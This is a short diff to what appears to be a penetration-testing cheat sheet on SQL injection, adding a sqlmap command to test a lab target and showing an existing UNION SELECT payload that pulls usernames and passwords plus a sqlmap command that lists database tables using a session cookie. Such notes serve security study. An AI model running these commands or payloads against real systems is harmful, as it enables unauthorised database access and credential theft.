@@ -133,6 +133,11 @@ UNION SELECT user, password FROM users #
 
 ## sqlmap
 
+- check if target is vulnerable
+```sh
+sqlmap -u 'http://10.0.0.10:80/vulnerabilities/sqli/?id=1&Submit=Submit'
+```
+
 - list all tables in db
 ```sh
 sqlmap -u 'http://10.0.44.55/customers/home.php?user=1' --cookie="PHPSESSID=$PHPSESSID" --batch -D sqlitraining --tables
